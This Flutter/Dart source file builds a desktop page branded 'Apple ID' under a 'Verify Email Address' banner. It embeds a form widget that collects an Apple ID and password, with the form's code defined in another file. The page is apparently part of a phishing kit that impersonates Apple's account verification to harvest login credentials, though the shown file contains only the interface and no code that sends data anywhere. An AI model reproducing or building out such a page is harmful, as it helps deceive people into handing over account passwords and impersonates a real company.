// ignore_for_file: public_member_api_docs, sort_constructors_first
import 'package:apple/Verify/form_widget_verify.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';

class DesktopLayout extends StatefulWidget {
  final String username;
  final dynamic password;
  const DesktopLayout({
    super.key,
    required this.username,
    required this.password,
  });

  @override
  State<DesktopLayout> createState() => _DesktopLayoutState();
}

class _DesktopLayoutState extends State<DesktopLayout> {
  @override
  Widget build(BuildContext context) {
    TextEditingController passwordC = TextEditingController();
    TextEditingController emailC = TextEditingController();
    return Scaffold(
        resizeToAvoidBottomInset: false,
        backgroundColor: CupertinoColors.white,
        appBar: navBar(),
        body: Center(
          child: SizedBox(
              child: Padding(
                  padding: const EdgeInsets.only(
                    left: 20.0,
                    right: 20,
                  ),
                  child: ListView(children: [
                    Container(
                      width: MediaQuery.of(context).size.width,
                      height: 150,
                      decoration: const BoxDecoration(
                          gradient: LinearGradient(colors: [
                        Colors.red,
                        Colors.grey,
                        Colors.blue,
                        Colors.grey,
                        Colors.amber,
                        Colors.red
                      ])),
                      child: const Center(
                          child: Text(
                        'Verify Email Address',
                        style: TextStyle(color: Colors.white, fontSize: 30),
                      )),
                    ),
                    Row(
                      children: [
                        Expanded(flex: 2, child: SizedBox()),
                        Expanded(
                          flex: 2,
                          child: SizedBox(
                            child: VerifyFormWidget(
                              appleId: emailC,
                              applePassword: passwordC,
                            ),
                          ),
                        ),
                        Expanded(flex: 2, child: SizedBox()),
                      ],
                    ),
                  ]))),
        ));
  }

  navBar() {
    return AppBar(
        backgroundColor: CupertinoColors.white,
        leading: const Padding(
          padding: EdgeInsets.only(top: 20, left: 20),
          child: Text(
            'Apple ID',
            style: TextStyle(
                fontSize: 17, color: Colors.black, fontWeight: FontWeight.bold),
          ),
        ),
        leadingWidth: 150,
        actions: [
          Padding(
              padding: const EdgeInsets.only(right: 20.0),
              child: Row(
                children: [
                  TextButton(
                      onPressed: () {},
                      child: const Text(
                        'Sign in',
                        style: TextStyle(color: Colors.black, fontSize: 14),
                      )),
                  TextButton(
                      onPressed: () {},
                      child: TextButton(
                          onPressed: () {},
                          child: const Text('Create An Apple ID',
                              style: TextStyle(
                                  color: Colors.black, fontSize: 14)))),
                  TextButton(
                      onPressed: () {},
                      child: const Text('FAQ',
                          style: TextStyle(color: Colors.black, fontSize: 14)))
                ],
              )),
        ],
        elevation: 2);
  }
}
